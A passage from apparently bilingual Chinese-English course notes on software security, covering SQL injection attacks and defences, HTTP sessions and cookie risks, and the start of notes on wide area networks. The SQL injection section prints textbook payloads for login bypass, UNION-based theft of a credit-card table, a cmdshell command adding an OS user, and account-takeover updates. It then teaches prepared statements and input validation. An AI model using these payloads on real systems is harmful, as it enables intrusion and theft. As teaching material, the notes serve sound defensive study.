class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> USERS <span class=\"keyword\">WHERE</span> </span><br><span class=\"line\">  username<span class=\"operator\">=</span><span class=\"string\">&#x27;$username&#x27;</span> <span class=\"keyword\">AND</span> password<span class=\"operator\">=</span><span class=\"string\">&#x27;$password&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>User enters the following as  <code>$username</code>  and  <code>$password</code></p>\n <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; OR password LIKE &#x27;</span><span class=\"operator\">%</span> </span><br></pre></td></tr></table></figure>\n<p>Server then executes</p>\n <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> USERS <span class=\"keyword\">WHERE</span> </span><br><span class=\"line\">  username<span class=\"operator\">=</span><span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">OR</span> password <span class=\"keyword\">LIKE</span> <span class=\"string\">&#x27;%&#x27;</span> <span class=\"keyword\">AND</span>  </span><br><span class=\"line\">  password<span class=\"operator\">=</span><span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">OR</span> password <span class=\"keyword\">LIKE</span> <span class=\"string\">&#x27;%&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><code>username='' OR password LIKE '%'</code>  的条件总是为真，因为  <code>password LIKE '%' </code> 可以匹配任何密码。</p>\n<ol start=\"2\">\n<li>Steal Data<br>\n 攻击者使用一种常见的技巧，通过构造特殊的输入，使查询条件总是返回 true，以便获取更多的数据。<br>\nWhen the result is returned to the user</li>\n</ol>\n <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> email <span class=\"keyword\">FROM</span> USERS <span class=\"keyword\">WHERE</span> </span><br><span class=\"line\">  username<span class=\"operator\">=</span><span class=\"string\">&#x27;$username&#x27;</span> <span class=\"keyword\">AND</span> password<span class=\"operator\">=</span><span class=\"string\">&#x27;$password&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>To get more data, attacker gives  <code>username</code></p>\n  <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; OR 1=1 #</span></span><br></pre></td></tr></table></figure>\n<p><code>1=1</code>  是一个始终为真的条件。<br>\n <code>#</code>  (在 MySQL 中) 或  <code>--</code>  (在其他 RDBMS 中) 表示注释符号，后面的所有内容都被忽略。这样一来， <code>AND password='$password' </code> 就被注释掉了，不会影响查询的结果。<br>\n因此最终结果是：</p>\n  <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> email <span class=\"keyword\">FROM</span> USERS <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">OR</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>由于  <code>WHERE</code>  子句总为真，查询会返回  <code>USERS</code>  表中所有用户的电子邮件地址，而不仅仅是匹配特定用户名和密码的记录。</p>\n<p>也可以从其他数据库窃取数据 通过输入 <code>username</code></p>\n  <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; AND 1=0 </span></span><br><span class=\"line\"><span class=\"string\"> UNION SELECT cardholder, number, exp_month, exp_year FROM </span></span><br><span class=\"line\"><span class=\"string\"> creditcards #</span></span><br></pre></td></tr></table></figure>\n<p>由于第一部分的条件不成立，原查询不返回任何结果；但  <code>UNION</code>  操作符使得查询的结果变成信用卡表中的数据，从而被攻击者获取。</p>\n<ol start=\"3\">\n<li>Run Shell Commands<br>\n 通过在数据库服务器上 执行 shell 命令，来创建一个新的用户账户。通过这种方式，攻击者能够突破数据库的边界，直接对操作系统进行修改，从而使服务器更加容易受到进一步的攻击。<br>\n用户输入：攻击者在用户名字段中输入以下字符串：</li>\n</ol>\n  <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;; exec cmdshell &#x27;</span>net <span class=\"keyword\">user</span> badguy badpwd<span class=\"string\">&#x27; /ADD #</span></span><br></pre></td></tr></table></figure>\n<p><code>';</code> ：结束了当前的 SQL 查询语句。<br>\n <code>exec cmdshell 'net user badguy badpwd' /ADD'</code> ：利用数据库服务器的  <code>cmdshell</code>  功能来执行系统命令。在这个例子中，它会创建一个名为  <code>badguy</code> ，密码为  <code>badpwd</code>  的新用户账户。<br>\n <code>#</code> ：注释符号，用来忽略后续的 SQL 语句。</p>\n<p>注入后的 SQL 查询变成了：</p>\n  <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> UserTable <span class=\"keyword\">WHERE</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;&#x27;</span>; <span class=\"keyword\">exec</span> cmdshell <span class=\"string\">&#x27;net user badguy badpwd&#x27;</span> <span class=\"operator\">/</span><span class=\"keyword\">ADD</span> #...</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>Change、Destory Data<br>\nCreate new users</li>\n</ol>\n  <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;; INSERT INTO USERS (&#x27;</span>uname<span class=\"string\">&#x27;,&#x27;</span>passwd<span class=\"string\">&#x27;) </span></span><br><span class=\"line\"><span class=\"string\"> VALUES (&#x27;</span>hacker<span class=\"string\">&#x27;,&#x27;</span><span class=\"number\">38</span>a74f<span class=\"string\">&#x27;); # </span></span><br></pre></td></tr></table></figure>\n<p>Reset email (or password, etc.)</p>\n  <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;; UPDATE USERS SET email=&#x27;</span>hacker<span class=\"variable\">@root</span>.org<span class=\"string\">&#x27;  </span></span><br><span class=\"line\"><span class=\"string\"> WHERE email=&#x27;</span>victim<span class=\"variable\">@yahoo</span>.com<span class=\"string\">&#x27;; #</span></span><br></pre></td></tr></table></figure>\n<ol start=\"5\">\n<li>Second-Order SQL Injections</li>\n</ol>\n  <figure class=\"highlight php\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">  <span class=\"variable\">$db</span> = <span class=\"title function_ invoke__\">mysql_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>, <span class=\"string\">&quot;root&quot;</span>, <span class=\"string\">&quot;password&quot;</span>); </span><br><span class=\"line\">  <span class=\"title function_ invoke__\">mysql_select_db</span>(<span class=\"string\">&quot;Shipping&quot;</span>, <span class=\"variable\">$db</span>); </span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"variable\">$id</span> = <span class=\"variable\">$HTTP_GET_VARS</span>[<span class=\"string\">&quot;id&quot;</span>]; </span><br><span class=\"line\">  <span class=\"variable\">$qry</span> = <span class=\"string\">&quot;SELECT ccnum FROM cust WHERE id = <span class=\"subst\">$id</span>&quot;</span>; </span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$qry</span>, <span class=\"variable\">$db</span>); </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$result</span>) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">mysql_result</span>(<span class=\"variable\">$result</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;ccnum&quot;</span>); </span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;No result!&quot;</span> . <span class=\"title function_ invoke__\">mysql_error</span>(); </span><br><span class=\"line\">  &#125; </span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>初始注入：攻击者设法将  <code>uname</code>  字段设置为： <code>admin' #</code> 。<br>\n在另一个活动中，例如密码更新操作，代码可能会使用之前存储的  <code>uname</code>  值。因为  <code>uname</code>  包含注释符号，实际执行的 SQL 语句将变成：</p>\n  <figure class=\"highlight sql\"><figcaption><span>Example</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> USERS <span class=\"keyword\">SET</span> passwd<span class=\"operator\">=</span><span class=\"string\">&#x27;cracked&#x27;</span> <span class=\"keyword\">WHERE</span> uname<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p>Persistent storage (such as a table row) is deemed as a <strong>trusted source</strong> thus may not be sanitised<br>\nAttacks may be subsequently executed by <strong>multiple</strong> activities</p>\n<h1 id=\"Preventing SQL Injection\" class=\"active\"><a class=\"anchor\"  href=\"#Preventing SQL Injection\">#</a>Preventing SQL Injection</h1>\n<ol>\n<li>Finding SQL Injection Vulnerabilities<br>\nAny application that has the following pattern is at risk of SQL injection\n<ol>\n<li>Take user input</li>\n<li>Do not check validity of user input</li>\n<li>Use user input data to query a database</li>\n<li>Use string manipulation to build the SQL query or the SQL exec command</li>\n</ol>\n</li>\n</ol>\n<ul>\n<li>Manual Techniques<br>\nTry entering junk SQL commands into input fields you suspect may not be validated\n<ul>\n<li>Use as username:  <code>abc' JFKDJ #</code> <br>\nLook for errors or unexpected behaviour</li>\n<li>Some web applications running in debug mode will show you the whole SQL statement to “help you debug”, but this also helps attackers attack</li>\n<li>常见的手动测试字符串：<br>\n <code>' OR 1=1 --</code> ：绕过身份验证。<br>\n <code>' UNION SELECT NULL, NULL, NULL --</code> ：尝试访问其他表中的数据。<br>\n <code>' AND (SELECT COUNT(*) FROM users) &gt; 0 --</code> ：检测查询逻辑。</li>\n</ul>\n</li>\n<li>Automated Techniques\n<ol>\n<li>Sqlmap (<span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5vcmc=\">sqlmap.org</span>) profiles the database on a given URL</li>\n</ol>\n<ul>\n<li>Identify vulnerable parameters</li>\n<li>Identify which types of attacks work</li>\n<li>Take over the database</li>\n</ul>\n<ol start=\"2\">\n<li>SQL Inject Me was a Firefox add-on</li>\n</ol>\n<ul>\n<li>Try standard SQL injection techniques for a variety of database languages</li>\n<li>In every form on a page</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Preventing SQL Injection\n<ol>\n<li>Input validation</li>\n</ol>\n<ul>\n<li>Filter any character with special meanings (apostrophes, semicolons, percent symbols, hyphens, etc.)</li>\n<li>Check the data type (e.g. make sure it’s an integer)</li>\n<li>Blacklisting “bad” characters doesn’t always work\n<ol>\n<li>Could prevent valid input (e.g. last name O’Brien)</li>\n<li>Forget to filter out some characters</li>\n</ol>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Escaping quotes<br>\nUse escape characters to prevent the quote from becoming part of the query. Example: convert  <code>' </code>  into  <code> \\'</code> . Different databases have different rules for escaping</li>\n<li>Whitelisting</li>\n</ol>\n<ul>\n<li>Allow only well-defined set of safe values</li>\n<li>Set implicitly defined through regular expressions 正则表达式</li>\n</ul>\n</li>\n<li>Best Solution: Prepared Statements( Separating code and data)<br>\nIn most injection attacks, data is interpreted as control: this changes the semantics of a query or a command</li>\n</ol>\n<ul>\n<li>Typed bind variables:  <code>? </code> placeholders guaranteed to be data (not control)</li>\n<li>Prepared statements are <strong>pre-compiled</strong> by the database management system waiting for input</li>\n<li>Placeholders prevent that the users input gets attached to the SQL query resulting in a separation of code and data</li>\n<li>For example, the database registers  <code>'Robert' ); DROP TABLE Students;--'</code><figure class=\"highlight java\"><figcaption><span>Prepared Statement: Java</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">PreparedStatement</span> <span class=\"variable\">ps</span> <span class=\"operator\">=</span> db.prepareStatement(</span><br><span class=\"line\">  <span class=\"string\">&quot;SELECT pizza, toppings, quantity, </span></span><br><span class=\"line\"><span class=\"string\">  order_day FROM orders WHERE userid=? </span></span><br><span class=\"line\"><span class=\"string\">  AND order_month=?&quot;</span></span><br><span class=\"line\">);</span><br><span class=\"line\"> ps.setInt(<span class=\"number\">1</span>, session.getCurrentUserId());</span><br><span class=\"line\"> ps.setInt(<span class=\"number\">2</span>, Integer.parseInt(request.getParameter(<span class=\"string\">&quot;month&quot;</span>)));</span><br><span class=\"line\"> <span class=\"type\">ResultSet</span> <span class=\"variable\">res</span> <span class=\"operator\">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure>\n</li>\n<li>使用预处理语句 (PreparedStatement)<br>\n <code>PreparedStatement</code>  是 Java 中用于执行预编译的 SQL 语句的对象，它确保 SQL 查询结构和输入数据的分离。在此代码中，使用  <code>?</code>  占位符来标记用户输入的位置，确保输入的数据不被解释为 SQL 控制逻辑。</li>\n<li>绑定变量<br>\n通过  <code>ps.setInt(1, ...)</code>  和  <code>ps.setInt(2, ...)</code>  方法，将 <code>用户 ID</code>  和 <code>月份</code> 参数绑定到相应的占位符上。<br>\n绑定的变量具有明确的类型（如 int、String 等），这确保了输入数据不会改变 SQL 查询的逻辑。</li>\n</ul>\n <figure class=\"highlight csharp\"><figcaption><span>Prepared Statement: ASP.NET</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">SqlCommand cmd = <span class=\"keyword\">new</span> SqlCommand(</span><br><span class=\"line\">  <span class=\"string\">&quot;SELECT * FROM UserTable </span></span><br><span class=\"line\"><span class=\"string\">   WHERE username = @User AND password = @Pwd&quot;</span>, </span><br><span class=\"line\">   dbConnection</span><br><span class=\"line\"> );</span><br><span class=\"line\"> cmd.Parameters.Add(<span class=\"string\">&quot;@User&quot;</span>, Request[<span class=\"string\">&quot;user&quot;</span>]);</span><br><span class=\"line\"> cmd.Parameters.Add(<span class=\"string\">&quot;@Pwd&quot;</span>, Request[<span class=\"string\">&quot;pwd&quot;</span>]);</span><br><span class=\"line\"> cmd.ExecuteReader();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>查询语句中的  <code>@User</code>  和  <code>@Pwd</code>  是参数占位符，用于标记用户输入的位置。<figure class=\"highlight php\"><figcaption><span>Prepared Statement: PHP</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"> <span class=\"variable\">$db</span> = <span class=\"title function_ invoke__\">mysqli_connect</span>(<span class=\"title function_ invoke__\">getServer</span>(), <span class=\"title function_ invoke__\">getUid</span>(), <span class=\"title function_ invoke__\">getPwd</span>()); </span><br><span class=\"line\"> <span class=\"variable\">$stmt</span> = <span class=\"title function_ invoke__\">mysqli_prepare</span>(<span class=\"variable\">$db</span>, <span class=\"string\">&quot;SELECT ccnum FROM cust WHERE id = ?&quot;</span>); </span><br><span class=\"line\"> <span class=\"variable\">$id</span> = <span class=\"variable\">$HTTP_GET_VARS</span>[<span class=\"string\">&quot;id&quot;</span>]; </span><br><span class=\"line\"> <span class=\"comment\">// 仅允许有效的ID（1-8位数字）</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^\\d&#123;1,8&#125;$/&#x27;</span>, <span class=\"variable\">$id</span>)) &#123; </span><br><span class=\"line\">     <span class=\"title function_ invoke__\">mysqli_stmt_bind_param</span>(<span class=\"variable\">$stmt</span>, <span class=\"string\">&quot;s&quot;</span>, <span class=\"variable\">$id</span>); </span><br><span class=\"line\">     <span class=\"title function_ invoke__\">mysqli_stmt_execute</span>(<span class=\"variable\">$stmt</span>); </span><br><span class=\"line\"> &#125; </span><br><span class=\"line\"> <span class=\"title function_ invoke__\">mysqli_stmt_bind_result</span>(<span class=\"variable\">$stmt</span>, <span class=\"variable\">$result</span>); </span><br><span class=\"line\"> <span class=\"title function_ invoke__\">mysqli_stmt_fetch</span>(<span class=\"variable\">$stmt</span>); </span><br><span class=\"line\"> ...</span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>SQL 查询中使用  <code>?</code>  作为占位符，表示参数的位置</li>\n<li>使用正则表达式  <code>preg_match('/^\\d&#123;1,8&#125;$/', $id)</code>  来验证用户输入。这确保了输入是 1 到 8 位的数字，过滤掉了潜在的恶意输入</li>\n<li>使用  <code>mysqli_stmt_bind_param($stmt, &quot;s&quot;, $id)</code>  方法将用户输入的 ID 作为参数绑定到预处理语句中。参数类型  <code>s</code>  指定绑定的变量是字符串类型（string）。</li>\n</ul>\n<ol start=\"4\">\n<li>Fixing SQL Injections</li>\n</ol>\n<ul>\n<li>Validate all input</li>\n<li>Never use string concatenation to build SQL statements</li>\n<li>Use parameterised stored procedures or other functions for database access</li>\n<li>Use least privileged accounts to connect to the database</li>\n<li>Remove access to all user defined tables and grant access only to stored procedures</li>\n</ul>\n","categories":["课程笔记","Principles of Software Security"],"tags":["software security","SQL"]},{"title":"Web Application Security","url":"/course/Web-Application-Security/","content":"<h1 id=\"Overall\" class=\"active\"><a class=\"anchor\"  href=\"#Overall\">#</a>Overall</h1>\n<ol>\n<li>Web Application Stack<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/672216036891d.png\" alt=\"img\"></li>\n<li>OSI Network Protocol Stack<br>\nMore in Network System<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/6722160374233.png\" alt=\"img\"></li>\n<li>Web Applications<br>\nSecurity problem is usually to do with dynamic creation of web contents<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/672216b529859.png\" alt=\"img\"></li>\n</ol>\n<h1 id=\"HTTP\" class=\"active\"><a class=\"anchor\"  href=\"#HTTP\">#</a>HTTP</h1>\n<h2 id=\"HTTP\" class=\"active\"><a class=\"anchor\"  href=\"#HTTP\">#</a>HTTP</h2>\n<ol>\n<li>HyperText Transport Protocol (HTTP)<br>\nHTTP is a request/response protocol for communicating between web clients and web servers.<br>\nA web client sends a request to a particular web server for a particular resource (identified by a URL) and the web server responds with some kind of data (often HTML data)</li>\n<li>HTTP Request Messag</li>\n</ol>\n<ul>\n<li>Send TCP/IP message to <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==\">www.example.com</span> on port 80 containing the following:<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/672217d602618.png\" alt=\"img\"></li>\n</ul>\n<ol start=\"3\">\n<li>HTTP Request Methods</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GET</td>\n<td>Retrieve information</td>\n</tr>\n<tr>\n<td>POST</td>\n<td>Request some operation be performed</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>Provide new information</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>Request something be removed from server</td>\n</tr>\n<tr>\n<td>HEAD</td>\n<td>Same as GET except that only header info is returned</td>\n</tr>\n<tr>\n<td>OPTIONS</td>\n<td>Request information about communication options available</td>\n</tr>\n<tr>\n<td>TRACE</td>\n<td>Used for testing and diagnosing problems</td>\n</tr>\n<tr>\n<td>CONNECT</td>\n<td>Used for tunnelling using proxies</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"4\">\n<li>HTTP Response Message<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/672217d60533f.png\" alt=\"img\"></li>\n<li>HTTP is a Stateless Protocol<br>\nHTTP is said to be a stateless protocol because each request is handled independently<br>\nAssumes no memory of requests that came before current request<br>\nIf a web server receives a number of HTTP requests from the same client, they are each handled by the server in exactly the same way as they would, had they been sent from different clients.</li>\n<li>HTML Forms: the GET Method<br>\nThe GET method sends encoded data appended to the URL string</li>\n</ol>\n<ul>\n<li>The data is separated from the URL by a ‘?’</li>\n<li>The encoded data and any path information are placed in the CGI environment variables  <code>QUERY_STRING</code>  and  <code>PATH_INFO</code></li>\n</ul>\n<ol start=\"7\">\n<li>HTML Forms: the Post Method<br>\nThe POST method sends encoded data in the body section of the request</li>\n</ol>\n<ul>\n<li>Data in the body is encoded in the same way as in the GET method</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Feature</th>\n<th>GET</th>\n<th>POST</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>用途</td>\n<td>通常用于信息检索，不会改变服务器状态</td>\n<td>提交数据进行处理，可能更新服务器或数据库状态</td>\n</tr>\n<tr>\n<td>可见性</td>\n<td>参数在 URL 中可见，易于调试</td>\n<td>参数隐藏在请求主体中</td>\n</tr>\n<tr>\n<td>安全性</td>\n<td>不适合提交密码等敏感信息</td>\n<td>不提供安全的隐私保护</td>\n</tr>\n<tr>\n<td>长度限制</td>\n<td>受 URL 最大字符长度限制</td>\n<td>受服务器可接受的数据量限制</td>\n</tr>\n<tr>\n<td>缓存性</td>\n<td>可以被缓存</td>\n<td>必须重新传输数据，且不会自动缓存</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"HTTP Sessions\" class=\"active\"><a class=\"anchor\"  href=\"#HTTP Sessions\">#</a>HTTP Sessions</h2>\n<ol>\n<li>HTTP Sessions<br>\nA sequence of requests and responses from one browser to one (or more) sites</li>\n</ol>\n<ul>\n<li>Session can be long or short\n<ul>\n<li>Google advertising tracking: 1+ years</li>\n<li>Google Mail login: 2 weeks</li>\n</ul>\n</li>\n<li>Authorise user once, and all subsequent requests are tied to user\n<ul>\n<li>Without session management, users would have to constantly reauthenticate</li>\n</ul>\n</li>\n<li>Web application environments (ASP, PHP, etc.) provide session tokens</li>\n</ul>\n<ol start=\"2\">\n<li>Session Tokens<br>\nIdentifying the specific session instance<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/67221c58289ab.png\" alt=\"img\">\n<ol>\n<li>Session Tokens in URLs<br>\nThe session token is part of the URL and will be sent to the web server through HTTP GET requests</li>\n</ol>\n<ul>\n<li>E.g. <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5leGFtcGxlLmNvbS9idXkuYXNwP2FydGljbGU9Mjc3ODE7c2Vzc2lvbmlkPUlFNTU3OTkwMTU3OA==\">http://www.example.com/buy.asp?article=27781;sessionid=IE5579901578</span></li>\n<li>This mechanism works even in case of client security restrictions (e.g., no cookies are allowed)<br>\nProblems:</li>\n<li>All information contained in the URL might be stored in firewall or proxy log files\n<ul>\n<li>Could simply be printed out with the web page on a shared printer</li>\n</ul>\n</li>\n<li>The URL, including sensitive data, can be sent in the HTTP referrer field to other web servers</li>\n<li>Imply a high risk of sensitive session data being disclosed to unauthorised third parties</li>\n</ul>\n<ol start=\"2\">\n<li>HTML Forms with Hidden Fields<br>\nSession token and information can be included in hidden fields in a form<br>\nWorks even in case of user client security restrictions, e.g., no cookies or JavaScript<br>\nDoes not provide protection mechanisms such as session expiration<br>\nCannot last beyond a single interactive session</li>\n</ol>\n</li>\n</ol>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">FORM</span> <span class=\"attr\">METHOD</span>=<span class=\"string\">&quot;POST&quot;</span> <span class=\"attr\">ACTION</span>=<span class=\"string\">&quot;/cgi-bin/order_goods.pl&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">INPUT</span> <span class=\"attr\">TYPE</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">NAME</span>=<span class=\"string\">&quot;customerid&quot;</span> <span class=\"attr\">VALUE</span>=<span class=\"string\">&quot;0815&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">INPUT</span> <span class=\"attr\">TYPE</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">NAME</span>=<span class=\"string\">&quot;valid_order&quot;</span> <span class=\"attr\">VALUE</span>=<span class=\"string\">&quot;yes&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">INPUT</span> <span class=\"attr\">TYPE</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">NAME</span>=<span class=\"string\">&quot;productid&quot;</span> <span class=\"attr\">VALUE</span>=<span class=\"string\">&quot;4711&quot;</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">FORM</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<pre><code>3. HTTP Cookies\n</code></pre>\n<p>Can be set either using HTTP headers or JavaScript<br>\nAn extra response header is added as follows to save information to the client</p>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Set-Cookie</span><span class=\"punctuation\">: </span>id=321328765; domain=.qut.edu.au; path=/cgi-bin</span><br></pre></td></tr></table></figure>\n<p>When a user sends an HTTP request for a URL for which the client machine<br>\nholds a cookie, an extra HTTP header is added to the client request every time</p>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie:id=321328765</span><br></pre></td></tr></table></figure>\n<p>Other attributes: Expires, Domain, HttpOnly, Path, Port, Secure<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/672221a731746.png\" alt=\"img\"><br>\n3.  Session tokens Risk<br>\n1. Predictable Tokens<br>\n- Counter (Verizon Wireless)<br>\n- Weak MAC (WSJ)<br>\n- token = {userid,  MAC_k(userid) }<br>\n- Apache Tomcat<br>\n-  <code>generateSessionID()</code>  uses MD5 but with a weak pseudorandom number generator <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9yZXNlYXJjaC93cC1jb250ZW50L3VwbG9hZHMvMjAxNi8wMi9nbTA1LnBkZg==\">CT-RSA 2005</span><br>\n- PHP<br>\n-  <code>create_session_id</code>  uses weak pseudorandom number generator <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWNsaXN0cy5vcmcvZnVsbGRpc2Nsb3N1cmUvMjAxMC9NYXIvNTE5\">seclists.org</span><br>\n2. Cookie Theft<br>\n 一些网站仅加密登录过程，而不加密会话 Cookie，从而导致会话令牌容易被截获<br>\n Example 1: login over HTTPS, but subsequently use HTTP<br>\n- 在不安全的网络环境（如无线咖啡馆）中，Cookie 可能被窃取。<br>\n- Other reasons why session token sent in the clear<br>\n- HTTPS/HTTP mixed content pages at site<br>\n- Man-in-the-middle attacks on SSL<br>\n- <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlYnV0bGVyLmNvbS8yMDEwLzEwLzI0L2ZpcmVzaGVlcC8=\">Firesheep</span> Firefox extension performs this attack</p>\n<pre><code>Example 2: Cross-Site Scripting (XSS) attacks\n</code></pre>\n","categories":["课程笔记","Principles of Software Security"],"tags":["software security","HTTP","OSI"]},{"title":"Wide Area Networking","url":"/course/Wide-Area-Networking/","content":"<h1 id=\"WAN\" class=\"active\"><a class=\"anchor\"  href=\"#WAN\">#</a>WAN</h1>\n<ul>\n<li>定义：广域网（WAN）跨越很大的地理距离，提供高数据吞吐量的长距离通信。</li>\n<li>选择 WAN 类型的考虑因素：\n<ul>\n<li>流量负载：预计传输的数据量。</li>\n<li>预算：设置和维护的财务预算。</li>\n<li>地理范围：覆盖的物理距离和区域。</li>\n<li>技术可用性：该区域内可用的技术选项。</li>\n</ul>\n</li>\n<li>LAN 和 WAN 的主要区别：\n<ul>\n<li>连接焦点：\n<ul>\n<li>局域网（LAN） 连接单个节点（如计算机和设备）。</li>\n<li>广域网（WAN） 则连接不同地点的整个网络，通常覆盖更大区域。</li>\n</ul>\n</li>\n<li>层次差异：\n<ul>\n<li>第 1 层和第 2 层（物理层和数据链路层）在访问方法、拓扑结构和媒体上有显著区别。</li>\n</ul>\n</li>\n<li>从 第 3 层（网络层）及以上，LAN 和 WAN 使用相同的协议。</li>\n</ul>\n</li>\n<li>所有权：\n<ul>\n<li>LAN 通常为个人或组织私有。</li>\n<li>WAN 则通常由 电信公司 或 网络服务提供商（NSP） 拥有和运营。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Entry Point Equipment\" class=\"active\"><a class=\"anchor\"  href=\"#Entry Point Equipment\">#</a>Entry Point Equipment</h1>\n接入点设备:\n<ul>\n<li>DSL 或有线互联网：在家中使用 DSL 或有线互联网服务时，需将路由器连接到调制解调器。</li>\n<li>调制解调器（Modem）：一种用于数字信号和模拟信号转换的设备。</li>\n<li>数据终端设备（Data Terminal Equipment DTE）：\n<ul>\n<li>客户端在 WAN 上的终端设备。</li>\n<li>负责 LAN 通信，通常由客户拥有。</li>\n</ul>\n</li>\n<li>数据通信设备（Data Communications Equipment DCE）：\n<ul>\n<li>运营商在 WAN 上的终端设备。</li>\n<li>负责 WAN 通信，通常由 ISP 拥有。</li>\n</ul>\n</li>\n<li>用户驻地设备（customer premises equipment CPE）：位于客户场所的设备。</li>\n<li>分界点（Demarc）：定义了运营商和客户责任的分界点。\n<ul>\n<li>分界点常见设备\n<ul>\n<li>NIU（network interface unit 网络接口单元）：连接 ISP 的本地环路与客户网络。</li>\n<li>线路驱动器 (Line 